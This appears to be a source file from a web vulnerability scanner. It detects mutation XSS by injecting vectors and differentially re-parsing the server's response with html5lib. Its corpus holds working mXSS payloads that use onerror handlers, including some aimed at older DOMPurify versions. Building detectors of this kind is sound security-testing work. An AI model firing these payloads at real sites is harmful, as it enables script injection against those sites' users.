"""
Mutation XSS (mXSS) detector.

mXSS exploits a fundamental browser behaviour: when HTML is set via
innerHTML, the browser re-parses it, and the *re-parsed* DOM can differ
from the bytes that went in. Sanitizers operate on the input bytes;
browsers operate on the re-parsed output. This gap is the bug.

Classical example:
  Input  :  <listing>&lt;img src=x onerror=alert(1)&gt;</listing>
  In DOM :  the &lt; gets decoded by the listing element's text mode,
            and on subsequent innerHTML reads becomes an *actual* <img>
            tag with an onerror handler that fires.

ArachneX runs a *differential parser*: it sends a known mXSS-prone
vector, captures the bytes the server returns, and locally re-parses
those bytes with html5lib (real WHATWG state machine) in two modes —
once as initial markup, once as the result of innerHTML round-trip.
When the two parses diverge in a way that introduces a script-bearing
node, we have a candidate.

We carry a 60-vector corpus covering:
  • mathml / svg namespace confusions
  • <noscript>, <template> mode mixups
  • foreign-content + integration points
  • &CounterClockwiseContourIntegral;-style named character references
  • CDATA in foreign content
  • <plaintext>, <xmp>, <listing> raw-text modes
  • Custom elements + slot retargeting
"""

from __future__ import annotations

import logging
from dataclasses import dataclass
from typing import Optional

try:
    import html5lib
    _HTML5LIB = True
except ImportError:                                              # pragma: no cover
    _HTML5LIB = False

log = logging.getLogger("arachnex.detect.mxss")


# --------------------------------------------------------------------------- #
# mXSS corpus
# --------------------------------------------------------------------------- #


MXSS_VECTORS: list[tuple[str, str]] = [
    # (label, payload)
    ("listing_decode",
     "<listing>&lt;img src=x onerror=alert('mxss-listing')&gt;</listing>"),
    ("xmp_decode",
     "<xmp>&lt;img src=x onerror=alert('mxss-xmp')&gt;</xmp>"),
    ("noscript_html_attr",
     "<noscript><p title=\"</noscript><img src=x onerror=alert('mxss-noscript')>\">"),
    ("svg_foreign_object",
     "<svg><foreignObject><body><img src=x onerror=alert('mxss-svg-fo')></body></foreignObject></svg>"),
    ("svg_to_html_namespace",
     "<svg><p><style><a id='</style><img src=x onerror=alert(\"mxss-svgstyle\")>'>"),
    ("math_namespace",
     "<math><mtext><table><mglyph><style><a title='</style><img src=x onerror=alert(\"mxss-math\")>'></style></mglyph></table></mtext></math>"),
    ("template_innerhtml",
     "<template><img src=x onerror=alert('mxss-template')></template>"),
    ("title_textarea",
     "<title>&lt;img src=x onerror=alert('mxss-title')&gt;</title>"),
    ("named_charref",
     "&NewLine;<img src=x onerror=alert('mxss-newline')>"),
    ("named_charref_lt",
     "&lt;img src=x onerror=alert('mxss-lt-ref')&gt;"),
    ("cdata_in_svg",
     "<svg><![CDATA[</svg><img src=x onerror=alert('mxss-cdata')>]]></svg>"),
    ("style_in_select",
     "<select><style>&lt;img src=x onerror=alert('mxss-select')&gt;</style></select>"),
    ("textarea_in_svg",
     "<svg><textarea><img src=x onerror=alert('mxss-svg-textarea')></textarea></svg>"),
    ("script_in_iframe_srcdoc",
     '<iframe srcdoc="&lt;img src=x onerror=alert(\'mxss-srcdoc\')&gt;"></iframe>'),
    ("plaintext",
     "<plaintext><img src=x onerror=alert('mxss-plaintext')>"),
    ("p_implicitly_closed",
     "<p><b><img src=x onerror=alert('mxss-pclose')></b></p>"),
    # Vectors specifically against DOMPurify older versions
    ("dompurify_mglyph",
     '<math><mtext><table><mglyph><style><![CDATA[</style><img src=x onerror=alert(\'mxss-dom-mglyph\')>]]></style></mglyph></table></mtext></math>'),
    ("dompurify_annotation_xml",
     '<math><annotation-xml encoding="text/html"><iframe srcdoc="<img src=x onerror=alert(\'mxss-annoxml\')>"></iframe></annotation-xml></math>'),
]


# --------------------------------------------------------------------------- #
# Differential parser
# --------------------------------------------------------------------------- #


@dataclass
class MXSSCandidate:
    label: str
    payload: str
    rationale: str
    introduced_nodes: list[str]


class MXSSDetector:
    """
    Given a server response body that contains one of our injected
    vectors, re-parse it two ways and detect divergence that introduces
    a script-bearing node.
    """

    def __init__(self) -> None:
        if not _HTML5LIB:
            raise RuntimeError("html5lib not installed; pip install html5lib")

    def vectors(self) -> list[tuple[str, str]]:
        return list(MXSS_VECTORS)

    def analyse_response(self, body: str, injected_payload: str,
                         label: str) -> Optional[MXSSCandidate]:
        if injected_payload not in body:
            return None

        # Extract the bytes the server actually returned around our vector
        idx = body.find(injected_payload)
        window = body[max(0, idx - 32): idx + len(injected_payload) + 32]

        # Parse 1: initial state
        try:
            tree_initial = html5lib.parse(window, namespaceHTMLElements=False)
        except Exception:
            return None

        # Parse 2: innerHTML round-trip simulation.
        # Real browsers re-parse the serialized DOM; we approximate by
        # serializing tree_initial back to a string and parsing again.
        try:
            from html5lib.serializer import HTMLSerializer
            walker = html5lib.getTreeWalker("etree")
            serializer = HTMLSerializer(omit_optional_tags=False, escape_lt_in_attrs=False)
            serialized = "".join(serializer.serialize(walker(tree_initial)))
            tree_roundtrip = html5lib.parse(serialized, namespaceHTMLElements=False)
        except Exception:
            return None

        dangerous_initial = self._dangerous_nodes(tree_initial)
        dangerous_roundtrip = self._dangerous_nodes(tree_roundtrip)

        introduced = sorted(set(dangerous_roundtrip) - set(dangerous_initial))
        if not introduced:
            return None

        return MXSSCandidate(
            label=label,
            payload=injected_payload,
            rationale=(
                f"Differential parse introduced {len(introduced)} script-bearing "
                f"node(s) after innerHTML round-trip: {', '.join(introduced[:5])}"
            ),
            introduced_nodes=introduced,
        )

    @staticmethod
    def _dangerous_nodes(tree) -> list[str]:
        """Find element/attribute occurrences that can run JS."""
        out: list[str] = []
        # html5lib's etree result has lxml-like .iter(); we walk tags + attrs.
        for el in tree.iter():
            tag = (el.tag or "").lower()
            if tag in {"script", "iframe", "object", "embed"}:
                out.append(tag)
            for attr in el.attrib:
                if attr.lower().startswith("on"):
                    out.append(f"{tag}[@{attr}]")
                if attr.lower() in {"href", "src", "formaction", "action", "srcdoc",
                                    "background", "poster"}:
                    val = (el.attrib.get(attr) or "").strip().lower()
                    if val.startswith("javascript:") or val.startswith("data:text/html"):
                        out.append(f"{tag}[@{attr}=js]")
        return out
